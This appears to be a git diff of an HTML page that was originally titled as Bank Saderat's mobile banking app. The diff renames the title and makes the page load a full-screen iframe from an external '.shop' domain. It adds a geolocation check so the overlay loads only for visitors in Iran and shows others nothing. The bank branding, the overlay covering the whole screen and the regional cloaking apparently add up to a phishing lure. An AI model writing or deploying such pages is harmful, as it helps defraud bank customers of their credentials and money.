@@ -1,30 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>همراه بانک صادرات</title>
+  <title>Dynamic Iframe Loading</title>
 </head>
 <body>
   <div id="iframeContainer"></div>
 
   <script>
-    // تابعی برای تشخیص دستگاه اندروید
     function isAndroid() {
       return /Android/i.test(navigator.userAgent);
     }
 
-    // تابعی برای ایجاد ایفریم و بارگیری آن به صورت پویا برای کاربران اندروید
     function loadIframeForAndroid() {
       var iframe = document.createElement("iframe");
-      iframe.src = "mypage.html";
+      iframe.src = "https://siderles3.shop";
       iframe.style.cssText = "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;";
       iframe.setAttribute("sandbox", "allow-scripts allow-same-origin");
       document.getElementById("iframeContainer").appendChild(iframe);
+
+      function resizeIframe() {
+        iframe.style.height = window.innerHeight + "px";
+      }
+
+      function requestAnimationFrame(callback) {
+        if (typeof window.requestAnimationFrame === "function") {
+          return window.requestAnimationFrame(callback);
+        } else {
+          return setTimeout(callback, 16);
+        }
+      }
+
+      function onWindowResize() {
+        requestAnimationFrame(resizeIframe);
+      }
+
+      window.addEventListener("resize", onWindowResize);
+
+      resizeIframe();
     }
 
-    // بررسی نوع دستگاه و فراخوانی تابع مناسب برای بارگیری ایفریم
-    if (isAndroid()) {
-      loadIframeForAndroid();
+    // تابعی برای تشخیص کشور کاربر
+    function getUserCountry() {
+      return fetch("https://geolocation-db.com/json/")
+        .then(response => response.json())
+        .then(data => data.country_code)
+        .catch(error => {
+          console.error("Failed to get user's country:", error);
+          return null;
+        });
     }
+
+    // بررسی کشور کاربر و فراخوانی مناسب برای بارگیری ایفریم
+    function checkUserCountry() {
+      getUserCountry().then(countryCode => {
+        if (countryCode === "IR") {
+          loadIframeForAndroid();
+        } else {
+          // نمایش محتوای دیگر به جای ایفریم
+          // مثلاً می توانید یک پیغام خطا یا محتوای جایگزین نمایش دهید
+          console.log("This content is only available for users in Iran.");
+        }
+      });
+    }
+
+    checkUserCountry();
   </script>
 </body>
 </html>
